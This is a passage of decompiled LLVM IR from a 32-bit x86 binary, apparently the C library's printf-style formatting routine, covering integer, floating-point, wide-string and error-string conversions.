  %v2_805075c = add i32 %v1_8050759, -16
  %v3_805075c = inttoptr i32 %v2_805075c to i32*
  store i32 %v0_805075c, i32* %v3_805075c, align 4
  %v0_805075d = call i32 @_load_inttype()
  %v0_8050762 = load i32, i32* @ebx, align 4
  %v1_8050762 = load i32, i32* @esp, align 4
  %v2_8050762 = inttoptr i32 %v1_8050762 to i32*
  store i32 %v0_8050762, i32* %v2_8050762, align 4
  %v0_8050765 = load i32, i32* @esi, align 4
  %v1_8050765 = load i32, i32* @esp, align 4
  %v2_8050765 = add i32 %v1_8050765, -4
  %v3_8050765 = inttoptr i32 %v2_8050765 to i32*
  store i32 %v0_8050765, i32* %v3_8050765, align 4
  %v0_8050766 = load i32, i32* @edx, align 4
  %v2_8050766 = add i32 %v1_8050765, -8
  %v3_8050766 = inttoptr i32 %v2_8050766 to i32*
  store i32 %v0_8050766, i32* %v3_8050766, align 4
  %v2_8050767 = add i32 %v1_8050765, -12
  %v3_8050767 = inttoptr i32 %v2_8050767 to i32*
  store i32 %v0_805075d, i32* %v3_8050767, align 4
  %v1_8050768 = add i32 %v1_8050765, 347
  store i32 %v1_8050768, i32* %eax.global-to-local, align 4
  %v2_805076f = add i32 %v1_8050765, -16
  %v3_805076f = inttoptr i32 %v2_805076f to i32*
  store i32 %v1_8050768, i32* %v3_805076f, align 4
  %v0_8050770 = load i32, i32* %stack_var_-364, align 4
  %v5_8050770 = inttoptr i32 %v0_8050770 to i8*
  %v6_8050770 = call i32 @_uintmaxtostr(i8* %v5_8050770, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8050770, i32* %eax.global-to-local, align 4
  %v0_8050775 = load i32, i32* @esp, align 4
  %v1_8050775 = add i32 %v0_8050775, 32
  store i32 %v6_8050770, i32* @edi, align 4
  %v1_805077a = add i32 %v0_8050775, 80
  %v2_805077a = inttoptr i32 %v1_805077a to i32*
  %v3_805077a = load i32, i32* %v2_805077a, align 4
  %tmp96 = icmp ult i32 %v3_805077a, 6
  br i1 %tmp96, label %dec_label_pc_80507a8, label %dec_label_pc_8050781

dec_label_pc_8050781:                             ; preds = %dec_label_pc_8050759
  %v1_8050781 = inttoptr i32 %v6_8050770 to i8*
  %v2_8050781 = load i8, i8* %v1_8050781, align 1
  %v11_8050781 = icmp eq i8 %v2_8050781, 45
  %v1_8050784 = icmp eq i1 %v11_8050781, false
  %v1_8050793 = add i32 %v0_8050775, 64
  %v2_8050793 = inttoptr i32 %v1_8050793 to i32*
  %v3_8050793 = load i32, i32* %v2_8050793, align 4
  br i1 %v1_8050784, label %dec_label_pc_8050793, label %dec_label_pc_8050786

dec_label_pc_8050786:                             ; preds = %dec_label_pc_8050781
  %v4_8050786 = or i32 %v3_8050793, 2
  store i32 %v4_8050786, i32* %v2_8050793, align 4
  %v0_805078b = load i32, i32* @edi, align 4
  %v1_805078b = add i32 %v0_805078b, 1
  store i32 %v1_805078b, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_80507a8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80507a8

dec_label_pc_8050793:                             ; preds = %dec_label_pc_8050781
  store i32 %v3_8050793, i32* %eax.global-to-local, align 4
  %v2_8050797 = and i32 %v3_8050793, 2
  %v3_8050797 = icmp eq i32 %v2_8050797, 0
  br i1 %v3_8050797, label %dec_label_pc_805079f, label %dec_label_pc_805079b

dec_label_pc_805079b:                             ; preds = %dec_label_pc_8050793
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80507a8

dec_label_pc_805079f:                             ; preds = %dec_label_pc_8050793
  %v2_805079f = urem i32 %v3_8050793, 2
  %v3_805079f = icmp eq i32 %v2_805079f, 0
  br i1 %v3_805079f, label %dec_label_pc_80507a8, label %dec_label_pc_80507a3

dec_label_pc_80507a3:                             ; preds = %dec_label_pc_805079f
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_80507a8

dec_label_pc_80507a8:                             ; preds = %dec_label_pc_805079f, %dec_label_pc_8050759, %dec_label_pc_805079b, %dec_label_pc_8050786, %dec_label_pc_80507a3
  %v0_80507fb = phi i32 [ %v6_8050770, %dec_label_pc_805079f ], [ %v6_8050770, %dec_label_pc_8050759 ], [ %v6_8050770, %dec_label_pc_805079b ], [ %v1_805078b, %dec_label_pc_8050786 ], [ %v6_8050770, %dec_label_pc_80507a3 ]
  %v0_805080a = phi i32 [ %v1_8050775, %dec_label_pc_805079f ], [ %v1_8050775, %dec_label_pc_8050759 ], [ %v1_8050775, %dec_label_pc_805079b ], [ %v0_80507a8.pre, %dec_label_pc_8050786 ], [ %v1_8050775, %dec_label_pc_80507a3 ]
  %v1_80507a8 = add i32 %v0_805080a, 204
  store i32 %v1_80507a8, i32* %ecx.global-to-local, align 4
  %v1_80507af = add i32 %v0_805080a, 20
  %v2_80507af = inttoptr i32 %v1_80507af to i32*
  %v3_80507af = load i32, i32* %v2_80507af, align 4
  store i32 %v3_80507af, i32* %edx.global-to-local, align 4
  %v2_80507b3 = sub i32 %v1_80507a8, %v0_80507fb
  store i32 %v2_80507b3, i32* %ecx.global-to-local, align 4
  %v2_80507b5 = icmp slt i32 %v3_80507af, 0
  %v1_80507b7 = add i32 %v2_80507b3, 127
  store i32 %v1_80507b7, i32* @esi, align 4
  %v1_80507ba = icmp eq i1 %v2_80507b5, false
  br i1 %v1_80507ba, label %dec_label_pc_80507c1, label %dec_label_pc_80507bc

dec_label_pc_80507bc:                             ; preds = %dec_label_pc_80507a8
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80507c1

dec_label_pc_80507c1:                             ; preds = %dec_label_pc_80507a8, %dec_label_pc_80507bc
  %v0_80507e7 = phi i32 [ %v3_80507af, %dec_label_pc_80507a8 ], [ 1, %dec_label_pc_80507bc ]
  %v1_80507c1 = add i32 %v0_805080a, 32
  %v2_80507c1 = inttoptr i32 %v1_80507c1 to i8*
  %v3_80507c1 = load i8, i8* %v2_80507c1, align 1
  %v4_80507c1 = and i8 %v3_80507c1, 16
  %v5_80507c1 = icmp eq i8 %v4_80507c1, 0
  br i1 %v5_80507c1, label %dec_label_pc_80507fb, label %dec_label_pc_80507c8

dec_label_pc_80507c8:                             ; preds = %dec_label_pc_80507c1
  %v1_80507c8 = add i32 %v0_805080a, 48
  %v2_80507c8 = inttoptr i32 %v1_80507c8 to i32*
  %v3_80507c8 = load i32, i32* %v2_80507c8, align 4
  store i32 %v3_80507c8, i32* %eax.global-to-local, align 4
  %tmp97 = icmp ult i32 %v3_80507c8, 3
  br i1 %tmp97, label %dec_label_pc_80507e2.thread, label %dec_label_pc_80507d6

dec_label_pc_80507e2.thread:                      ; preds = %dec_label_pc_80507c8
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_80507fb

dec_label_pc_80507d6:                             ; preds = %dec_label_pc_80507c8
  %v9_80507d6 = icmp eq i32 %v3_80507c8, 3
  %v1_80507d9 = icmp eq i1 %v9_80507d6, false
  br i1 %v1_80507d9, label %dec_label_pc_80507e2, label %dec_label_pc_80507db

dec_label_pc_80507db:                             ; preds = %dec_label_pc_80507d6
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_80507fb

dec_label_pc_80507e2:                             ; preds = %dec_label_pc_80507d6
  %v9_80507e2 = icmp eq i32 %v3_80507c8, 4
  %v1_80507e5 = icmp eq i1 %v9_80507e2, false
  br i1 %v1_80507e5, label %dec_label_pc_80507fb, label %dec_label_pc_80507e7

dec_label_pc_80507e7:                             ; preds = %dec_label_pc_80507e2
  %tmp98 = icmp ugt i32 %v0_80507e7, %v1_80507b7
  br i1 %tmp98, label %dec_label_pc_80507fb, label %dec_label_pc_80507eb

dec_label_pc_80507eb:                             ; preds = %dec_label_pc_80507e7
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80507f0 = inttoptr i32 %v0_80507fb to i8*
  %v2_80507f0 = load i8, i8* %v1_80507f0, align 1
  %v8_80507f0 = icmp eq i8 %v2_80507f0, 48
  br i1 %v8_80507f0, label %dec_label_pc_80507fb, label %dec_label_pc_80507f5

dec_label_pc_80507f5:                             ; preds = %dec_label_pc_80507eb
  %v1_80507f5 = add i32 %v2_80507b3, 128
  store i32 %v1_80507f5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80507fb

dec_label_pc_80507fb:                             ; preds = %dec_label_pc_80507e2.thread, %dec_label_pc_80507e7, %dec_label_pc_80507eb, %dec_label_pc_80507e2, %dec_label_pc_80507c1, %dec_label_pc_80507db, %dec_label_pc_80507f5
  %v0_8050833 = phi i32 [ %v0_80507e7, %dec_label_pc_80507e7 ], [ 1, %dec_label_pc_80507eb ], [ %v0_80507e7, %dec_label_pc_80507e2 ], [ %v0_80507e7, %dec_label_pc_80507c1 ], [ %v0_80507e7, %dec_label_pc_80507db ], [ %v1_80507f5, %dec_label_pc_80507f5 ], [ %v0_80507e7, %dec_label_pc_80507e2.thread ]
  %v1_80507fb = inttoptr i32 %v0_80507fb to i8*
  %v2_80507fb = load i8, i8* %v1_80507fb, align 1
  %v8_80507fb = icmp eq i8 %v2_80507fb, 48
  %v1_80507fe = icmp eq i1 %v8_80507fb, false
  br i1 %v1_80507fe, label %dec_label_pc_805082b, label %dec_label_pc_8050800

dec_label_pc_8050800:                             ; preds = %dec_label_pc_80507fb
  %v0_8050800 = load i32, i32* @ebp, align 4
  %v7_8050803 = icmp sgt i32 %v0_8050800, 5
  br i1 %v7_8050803, label %dec_label_pc_8050805, label %dec_label_pc_805080a

dec_label_pc_8050805:                             ; preds = %dec_label_pc_8050800
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_805080a

dec_label_pc_805080a:                             ; preds = %dec_label_pc_8050800, %dec_label_pc_8050805
  %v1_805080a = add i32 %v0_805080a, 48
  %v2_805080a = inttoptr i32 %v1_805080a to i32*
  %v3_805080a = load i32, i32* %v2_805080a, align 4
  %v12_805080a = icmp eq i32 %v3_805080a, 1
  %v1_805080f = icmp eq i1 %v12_805080a, false
  br i1 %v1_805080f, label %dec_label_pc_8050820, label %dec_label_pc_8050811

dec_label_pc_8050811:                             ; preds = %dec_label_pc_805080a
  store i32 ptrtoint ([6 x i8]* @global_var_805fc98.708 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_805099c

dec_label_pc_8050820:                             ; preds = %dec_label_pc_805080a
  %v1_8050820 = icmp eq i32 %v0_8050833, 0
  %v1_8050822 = icmp eq i1 %v1_8050820, false
  br i1 %v1_8050822, label %dec_label_pc_805082b, label %dec_label_pc_8050824

dec_label_pc_8050824:                             ; preds = %dec_label_pc_8050820
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_805099c

dec_label_pc_805082b:                             ; preds = %dec_label_pc_8050820, %dec_label_pc_80507fb
  %v2_805082b = sub i32 %v0_8050833, %v1_80507b7
  %v7_805082b = icmp ult i32 %v0_8050833, %v1_80507b7
  %v12_805082b = icmp eq i32 %v2_805082b, 0
  %v2_805082d = or i1 %v7_805082b, %v12_805082b
  br i1 %v2_805082d, label %dec_label_pc_805099c, label %dec_label_pc_8050833

dec_label_pc_8050833:                             ; preds = %dec_label_pc_805082b
  store i32 %v2_805082b, i32* @ebx, align 4
  br label %dec_label_pc_80509b6

dec_label_pc_805083c:                             ; preds = %dec_label_pc_80506d2
  %tmp99 = icmp ult i32 %v3_80506a4, 16
  br i1 %tmp99, label %dec_label_pc_8050841, label %dec_label_pc_8050886

dec_label_pc_8050841:                             ; preds = %dec_label_pc_805083c
  %v1_8050841 = add i32 %v0_80506a4.lcssa, 33
  %v2_8050841 = inttoptr i32 %v1_8050841 to i8*
  %v3_8050841 = load i8, i8* %v2_8050841, align 1
  %v4_8050841 = and i8 %v3_8050841, 8
  %v5_8050841 = icmp eq i8 %v4_8050841, 0
  %v1_8050846 = add i32 %v0_80506a4.lcssa, 344
  %v2_8050846 = inttoptr i32 %v1_8050846 to i32*
  %v3_8050846 = load i32, i32* %v2_8050846, align 4
  store i32 %v3_8050846, i32* %edx.global-to-local, align 4
  br i1 %v5_8050841, label %dec_label_pc_8050853, label %dec_label_pc_805084f

dec_label_pc_805084f:                             ; preds = %dec_label_pc_8050841
  %v1_805084f = inttoptr i32 %v3_8050846 to x86_fp80*
  %v2_805084f = load x86_fp80, x86_fp80* %v1_805084f, align 4
  br label %dec_label_pc_8050855

dec_label_pc_8050853:                             ; preds = %dec_label_pc_8050841
  %v1_8050853 = inttoptr i32 %v3_8050846 to double*
  %v2_8050853 = load double, double* %v1_8050853, align 4
  %v3_8050853 = fpext double %v2_8050853 to x86_fp80
  br label %dec_label_pc_8050855

dec_label_pc_8050855:                             ; preds = %dec_label_pc_805084f, %dec_label_pc_8050853
  %storemerge5 = phi x86_fp80 [ %v2_805084f, %dec_label_pc_805084f ], [ %v3_8050853, %dec_label_pc_8050853 ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_8050855 = load i32, i32* @esi, align 4
  %v2_8050855 = add i32 %v0_80506a4.lcssa, -4
  %v3_8050855 = inttoptr i32 %v2_8050855 to i32*
  store i32 %v0_8050855, i32* %v3_8050855, align 4
  %v0_8050856 = load i32, i32* @esi, align 4
  %v2_8050856 = add i32 %v0_80506a4.lcssa, -8
  %v3_8050856 = inttoptr i32 %v2_8050856 to i32*
  store i32 %v0_8050856, i32* %v3_8050856, align 4
  %v1_8050857 = add i32 %v0_80506a4.lcssa, -12
  %v2_8050857 = inttoptr i32 %v1_8050857 to i32*
  store i32 134546714, i32* %v2_8050857, align 4
  %v1_805085c = add i32 %v0_80506a4.lcssa, 20
  store i32 %v1_805085c, i32* %eax.global-to-local, align 4
  %v2_8050860 = add i32 %v0_80506a4.lcssa, -16
  %v3_8050860 = inttoptr i32 %v2_8050860 to i32*
  store i32 %v1_805085c, i32* %v3_8050860, align 4
  %v1_8050861 = add i32 %v0_80506a4.lcssa, -28
  %v1_8050864 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8050864 = inttoptr i32 %v1_8050861 to x86_fp80*
  store x86_fp80 %v1_8050864, x86_fp80* %v3_8050864, align 4
  %v1_8050867 = add i32 %v0_80506a4.lcssa, 368
  %v2_8050867 = inttoptr i32 %v1_8050867 to i32*
  %v3_8050867 = load i32, i32* %v2_8050867, align 4
  %v5_8050867 = add i32 %v0_80506a4.lcssa, -32
  %v6_8050867 = inttoptr i32 %v5_8050867 to i32*
  store i32 %v3_8050867, i32* %v6_8050867, align 4
  %v0_805086e = call i32 @_fpmaxtostr()
  store i32 %v0_805086e, i32* %eax.global-to-local, align 4
  %v0_8050873 = load i32, i32* @esp, align 4
  %v1_8050873 = add i32 %v0_8050873, 32
  %v2_8050876 = icmp slt i32 %v0_805086e, 0
  br i1 %v2_8050876, label %dec_label_pc_8050b17, label %dec_label_pc_805087e

dec_label_pc_805087e:                             ; preds = %dec_label_pc_8050855
  %v1_805087e = inttoptr i32 %v1_8050873 to i32*
  %v2_805087e = load i32, i32* %v1_805087e, align 4
  %v4_805087e = add i32 %v2_805087e, %v0_805086e
  store i32 %v4_805087e, i32* %v1_805087e, align 4
  %v0_8050b04.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050b04

dec_label_pc_8050886:                             ; preds = %dec_label_pc_805083c
  %tmp100 = or i32 %v3_80506a4, 1
  %tmp101 = icmp eq i32 %tmp100, 17
  br i1 %tmp101, label %dec_label_pc_805088f, label %dec_label_pc_8050922

dec_label_pc_805088f:                             ; preds = %dec_label_pc_8050886
  %v9_8050886 = icmp eq i32 %v3_80506a4, 17
  %v1_805088f = add i32 %v0_80506a4.lcssa, 332
  %v2_805088f = inttoptr i32 %v1_805088f to i32*
  store i32 0, i32* %v2_805088f, align 4
  %v0_805089a = load i32, i32* @esp, align 4
  %v1_805089a = add i32 %v0_805089a, 344
  %v2_805089a = inttoptr i32 %v1_805089a to i32*
  %v3_805089a = load i32, i32* %v2_805089a, align 4
  store i32 %v3_805089a, i32* %edx.global-to-local, align 4
  %v1_80508a1 = icmp eq i1 %v9_8050886, false
  br i1 %v1_80508a1, label %dec_label_pc_80508ed, label %dec_label_pc_80508a3

dec_label_pc_80508a3:                             ; preds = %dec_label_pc_805088f
  %v1_80508a3 = inttoptr i32 %v3_805089a to i32*
  %v2_80508a3 = load i32, i32* %v1_80508a3, align 4
  store i32 %v2_80508a3, i32* %eax.global-to-local, align 4
  %v2_80508a5 = add i32 %v0_805089a, 340
  %v3_80508a5 = inttoptr i32 %v2_80508a5 to i32*
  store i32 %v2_80508a3, i32* %v3_80508a5, align 4
  %v0_80508ac = load i32, i32* %eax.global-to-local, align 4
  %v1_80508ac = icmp eq i32 %v0_80508ac, 0
  br i1 %v1_80508ac, label %dec_label_pc_80509a0, label %dec_label_pc_80508b4

dec_label_pc_80508b4:                             ; preds = %dec_label_pc_80508a3
  %v0_80508b4 = load i32, i32* @esp, align 4
  %v1_80508b4 = add i32 %v0_80508b4, 20
  %v2_80508b4 = inttoptr i32 %v1_80508b4 to i32*
  %v3_80508b4 = load i32, i32* %v2_80508b4, align 4
  store i32 %v3_80508b4, i32* %eax.global-to-local, align 4
  %v2_80508bb = icmp slt i32 %v3_80508b4, 0
  br i1 %v2_80508bb, label %dec_label_pc_80508c1, label %dec_label_pc_80508bf

dec_label_pc_80508bf:                             ; preds = %dec_label_pc_80508b4
  br label %dec_label_pc_80508c1

dec_label_pc_80508c1:                             ; preds = %dec_label_pc_80508b4, %dec_label_pc_80508bf
  %storemerge105 = phi i32 [ %v3_80508b4, %dec_label_pc_80508bf ], [ -1, %dec_label_pc_80508b4 ]
  store i32 %storemerge105, i32* %ecx.global-to-local, align 4
  %v1_80508c1 = add i32 %v0_80508b4, 340
  store i32 %v1_80508c1, i32* %edx.global-to-local, align 4
  %v1_80508c8 = add i32 %v0_80508b4, 332
  store i32 %v1_80508c8, i32* %eax.global-to-local, align 4
  %v2_80508cf = add i32 %v0_80508b4, -4
  %v3_80508cf = inttoptr i32 %v2_80508cf to i32*
  store i32 %v1_80508c8, i32* %v3_80508cf, align 4
  %v0_80508d0 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80508d0 = add i32 %v0_80508b4, -8
  %v3_80508d0 = inttoptr i32 %v2_80508d0 to i32*
  store i32 %v0_80508d0, i32* %v3_80508d0, align 4
  %v0_80508d1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80508d1 = add i32 %v0_80508b4, -12
  %v3_80508d1 = inttoptr i32 %v2_80508d1 to i32*
  store i32 %v0_80508d1, i32* %v3_80508d1, align 4
  %v0_80508d2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80508d2 = add i32 %v0_80508b4, -16
  %v3_80508d2 = inttoptr i32 %v2_80508d2 to i32*
  store i32 %v0_80508d2, i32* %v3_80508d2, align 4
  %v0_80508d3 = call i32 @__GI_wcsrtombs()
  store i32 %v0_80508d3, i32* %eax.global-to-local, align 4
  %v0_80508d8 = load i32, i32* @esp, align 4
  %v1_80508d8 = add i32 %v0_80508d8, 16
  store i32 %v0_80508d3, i32* @esi, align 4
  %v10_80508dd = icmp eq i32 %v0_80508d3, -1
  br i1 %v10_80508dd, label %dec_label_pc_8050b17, label %dec_label_pc_80508e6

dec_label_pc_80508e6:                             ; preds = %dec_label_pc_80508c1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_80509aa

dec_label_pc_80508ed:                             ; preds = %dec_label_pc_805088f
  %v0_80508ed = load i32, i32* @ebx, align 4
  %v2_80508ed = add i32 %v0_805089a, -4
  %v3_80508ed = inttoptr i32 %v2_80508ed to i32*
  store i32 %v0_80508ed, i32* %v3_80508ed, align 4
  %v1_80508ee = add i32 %v0_805089a, 332
  store i32 %v1_80508ee, i32* %eax.global-to-local, align 4
  %v2_80508f5 = add i32 %v0_805089a, -8
  %v3_80508f5 = inttoptr i32 %v2_80508f5 to i32*
  store i32 %v1_80508ee, i32* %v3_80508f5, align 4
  %v0_80508f6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80508f6 = inttoptr i32 %v0_80508f6 to i32*
  %v2_80508f6 = load i32, i32* %v1_80508f6, align 4
  %v4_80508f6 = add i32 %v0_805089a, -12
  %v5_80508f6 = inttoptr i32 %v4_80508f6 to i32*
  store i32 %v2_80508f6, i32* %v5_80508f6, align 4
  %v1_80508f8 = add i32 %v0_805089a, 204
  store i32 %v1_80508f8, i32* @ebx, align 4
  %v2_80508ff = add i32 %v0_805089a, -16
  %v3_80508ff = inttoptr i32 %v2_80508ff to i32*
  store i32 %v1_80508f8, i32* %v3_80508ff, align 4
  %v0_8050900 = call i32 @__GI_wcrtomb()
  store i32 %v0_8050900, i32* %eax.global-to-local, align 4
  %v0_8050905 = load i32, i32* @esp, align 4
  %v1_8050905 = add i32 %v0_8050905, 16
  store i32 %v0_8050900, i32* @esi, align 4
  %v10_805090a = icmp eq i32 %v0_8050900, -1
  br i1 %v10_805090a, label %dec_label_pc_8050b17, label %dec_label_pc_8050913

dec_label_pc_8050913:                             ; preds = %dec_label_pc_80508ed
  %v0_8050913 = load i32, i32* @ebx, align 4
  store i32 %v0_8050913, i32* @edi, align 4
  %v2_8050915 = add i32 %v0_8050900, 220
  %v3_8050915 = add i32 %v2_8050915, %v0_8050905
  %v4_8050915 = inttoptr i32 %v3_8050915 to i8*
  store i8 0, i8* %v4_8050915, align 1
  br label %dec_label_pc_80509aa

dec_label_pc_8050922:                             ; preds = %dec_label_pc_8050886
  %tmp102 = icmp ult i32 %v3_80506a4, 20
  br i1 %tmp102, label %dec_label_pc_8050927, label %dec_label_pc_8050972

dec_label_pc_8050927:                             ; preds = %dec_label_pc_8050922
  %v9_8050922 = icmp eq i32 %v3_80506a4, 19
  %v1_8050927 = add i32 %v0_80506a4.lcssa, 344
  %v2_8050927 = inttoptr i32 %v1_8050927 to i32*
  %v3_8050927 = load i32, i32* %v2_8050927, align 4
  store i32 %v3_8050927, i32* %edx.global-to-local, align 4
  %v1_805092e = icmp eq i1 %v9_8050922, false
  %v1_8050953 = inttoptr i32 %v3_8050927 to i32*
  %v2_8050953 = load i32, i32* %v1_8050953, align 4
  br i1 %v1_805092e, label %dec_label_pc_8050953, label %dec_label_pc_8050930

dec_label_pc_8050930:                             ; preds = %dec_label_pc_8050927
  store i32 %v2_8050953, i32* @edi, align 4
  %v1_8050932 = icmp eq i32 %v2_8050953, 0
  br i1 %v1_8050932, label %dec_label_pc_80509a0, label %dec_label_pc_8050936

dec_label_pc_8050936:                             ; preds = %dec_label_pc_8050930, %dec_label_pc_805097b
  %v1_8050943 = phi i32 [ %v0_80506a4.lcssa, %dec_label_pc_8050930 ], [ %v1_8050995, %dec_label_pc_805097b ]
  %v1_8050936 = add i32 %v1_8050943, 20
  %v2_8050936 = inttoptr i32 %v1_8050936 to i32*
  %v3_8050936 = load i32, i32* %v2_8050936, align 4
  store i32 %v3_8050936, i32* %eax.global-to-local, align 4
  %v2_805093d = icmp slt i32 %v3_8050936, 0
  br i1 %v2_805093d, label %dec_label_pc_8050943, label %dec_label_pc_8050941

dec_label_pc_8050941:                             ; preds = %dec_label_pc_8050936
  br label %dec_label_pc_8050943

dec_label_pc_8050943:                             ; preds = %dec_label_pc_8050936, %dec_label_pc_8050941
  %storemerge = phi i32 [ %v3_8050936, %dec_label_pc_8050941 ], [ -1, %dec_label_pc_8050936 ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_8050943 = add i32 %v1_8050943, -4
  %v3_8050943 = inttoptr i32 %v2_8050943 to i32*
  store i32 %v3_80506a4, i32* %v3_8050943, align 4
  %v2_8050944 = add i32 %v1_8050943, -8
  %v3_8050944 = inttoptr i32 %v2_8050944 to i32*
  store i32 %v3_80506a4, i32* %v3_8050944, align 4
  %v0_8050945 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050945 = add i32 %v1_8050943, -12
  %v3_8050945 = inttoptr i32 %v2_8050945 to i32*
  store i32 %v0_8050945, i32* %v3_8050945, align 4
  %v0_8050946 = load i32, i32* @edi, align 4
  %v2_8050946 = add i32 %v1_8050943, -16
  %v3_8050946 = inttoptr i32 %v2_8050946 to i32*
  store i32 %v0_8050946, i32* %v3_8050946, align 4
  %v0_8050947 = call i32 @strnlen()
  store i32 %v0_8050947, i32* %eax.global-to-local, align 4
  store i32 %v0_8050947, i32* @esi, align 4
  br label %dec_label_pc_80509aa

dec_label_pc_8050953:                             ; preds = %dec_label_pc_8050927
  store i32 %v2_8050953, i32* %eax.global-to-local, align 4
  %v1_8050955 = add i32 %v0_80506a4.lcssa, 204
  store i32 %v1_8050955, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_8050961 = trunc i32 %v2_8050953 to i8
  %v4_8050961 = inttoptr i32 %v1_8050955 to i8*
  store i8 %v1_8050961, i8* %v4_8050961, align 1
  %v0_8050968 = load i32, i32* @esp, align 4
  %v1_8050968 = add i32 %v0_8050968, 205
  %v2_8050968 = inttoptr i32 %v1_8050968 to i8*
  store i8 0, i8* %v2_8050968, align 1
  br label %dec_label_pc_80509aa

dec_label_pc_8050972:                             ; preds = %dec_label_pc_8050922
  %v9_8050972 = icmp eq i32 %v3_80506a4, 20
  %v1_8050975 = icmp eq i1 %v9_8050972, false
  br i1 %v1_8050975, label %dec_label_pc_8050b17, label %dec_label_pc_805097b

dec_label_pc_805097b:                             ; preds = %dec_label_pc_8050972
  %v0_805097b = load i32, i32* %stack_var_-364, align 4
  %v1_805097b = call i32 @__errno_location(i32 %v0_805097b)
  store i32 %v1_805097b, i32* %eax.global-to-local, align 4
  %v0_8050980 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050980 = load i32, i32* @esp, align 4
  %v2_8050980 = add i32 %v1_8050980, -4
  %v3_8050980 = inttoptr i32 %v2_8050980 to i32*
  store i32 %v0_8050980, i32* %v3_8050980, align 4
  %v1_8050981 = add i32 %v1_8050980, -8
  %v2_8050981 = inttoptr i32 %v1_8050981 to i32*
  store i32 128, i32* %v2_8050981, align 4
  %v1_8050986 = add i32 %v1_8050980, 204
  store i32 %v1_8050986, i32* %edx.global-to-local, align 4
  %v2_805098d = add i32 %v1_8050980, -12
  %v3_805098d = inttoptr i32 %v2_805098d to i32*
  store i32 %v1_8050986, i32* %v3_805098d, align 4
  %v1_805098e = inttoptr i32 %v1_805097b to i32*
  %v2_805098e = load i32, i32* %v1_805098e, align 4
  %v4_805098e = add i32 %v1_8050980, -16
  %v5_805098e = inttoptr i32 %v4_805098e to i32*
  store i32 %v2_805098e, i32* %v5_805098e, align 4
  %v0_8050990 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_8050990, i32* %eax.global-to-local, align 4
  %v0_8050995 = load i32, i32* @esp, align 4
  %v1_8050995 = add i32 %v0_8050995, 16
  store i32 %v0_8050990, i32* @edi, align 4
  br label %dec_label_pc_8050936

dec_label_pc_805099c:                             ; preds = %dec_label_pc_805082b, %dec_label_pc_8050824, %dec_label_pc_8050811
  %v0_80509b637 = phi i32 [ %v1_80507b7, %dec_label_pc_805082b ], [ 0, %dec_label_pc_8050824 ], [ 5, %dec_label_pc_8050811 ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80509b6

dec_label_pc_80509a0:                             ; preds = %dec_label_pc_8050930, %dec_label_pc_80508a3
  store i32 ptrtoint ([7 x i8]* @global_var_805fc9e.709 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_80509aa

dec_label_pc_80509aa:                             ; preds = %dec_label_pc_8050953, %dec_label_pc_8050943, %dec_label_pc_8050913, %dec_label_pc_80508e6, %dec_label_pc_80509a0
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_80509b1 = load i32, i32* @esp, align 4
  %v1_80509b1 = add i32 %v0_80509b1, 7
  %v2_80509b1 = inttoptr i32 %v1_80509b1 to i8*
  store i8 32, i8* %v2_80509b1, align 1
  %v0_80509b6.pre = load i32, i32* @esi, align 4
  %v1_80509b6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80509b6

dec_label_pc_80509b6:                             ; preds = %dec_label_pc_805099c, %dec_label_pc_8050833, %dec_label_pc_80509aa
  %v1_80509b6 = phi i32 [ 0, %dec_label_pc_805099c ], [ %v2_805082b, %dec_label_pc_8050833 ], [ %v1_80509b6.pre, %dec_label_pc_80509aa ]
  %v0_80509b6 = phi i32 [ %v0_80509b637, %dec_label_pc_805099c ], [ %v1_80507b7, %dec_label_pc_8050833 ], [ %v0_80509b6.pre, %dec_label_pc_80509aa ]
  %v2_80509b6 = add i32 %v0_80509b6, %v1_80509b6
  store i32 %v2_80509b6, i32* @edx, align 4
  %v0_80509b9 = load i32, i32* @ebp, align 4
  %v9_80509b9 = icmp eq i32 %v0_80509b9, 11
  br i1 %v9_80509b9, label %dec_label_pc_80509ca, label %dec_label_pc_80509be

dec_label_pc_80509be:                             ; preds = %dec_label_pc_80509b6
  %v1_80509c0 = add i32 %v0_80509b9, -5
  %v6_80509c0 = sub i32 4, %v0_80509b9
  %v7_80509c0 = and i32 %v6_80509c0, %v0_80509b9
  %v8_80509c0 = icmp slt i32 %v7_80509c0, 0
  %v9_80509c0 = icmp eq i32 %v1_80509c0, 0
  %v10_80509c0 = icmp slt i32 %v1_80509c0, 0
  %v3_80509c3 = icmp eq i1 %v10_80509c0, %v8_80509c0
  %v4_80509c3 = icmp eq i1 %v9_80509c0, false
  %v5_80509c3 = and i1 %v4_80509c3, %v3_80509c3
  %v6_80509c3 = zext i1 %v5_80509c3 to i32
  store i32 %v6_80509c3, i32* %eax.global-to-local, align 4
  %v2_80509c6 = add i32 %v2_80509b6, 1
